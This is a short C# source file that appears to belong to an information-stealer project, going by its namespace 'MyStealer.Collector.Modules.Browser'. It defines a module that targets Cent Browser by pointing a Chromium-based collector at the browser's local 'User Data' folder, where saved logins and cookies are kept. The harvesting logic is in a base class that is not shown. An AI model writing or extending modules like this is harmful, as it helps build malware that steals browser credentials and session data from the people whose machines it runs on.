using System.IO;
using System;

namespace MyStealer.Collector.Modules.Browser.ChromiumBased
{
    public class CentBrowser : Chromium
    {
        public override string ModuleName => "Cent Browser";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "CentBrowser", "User Data");
    }
}
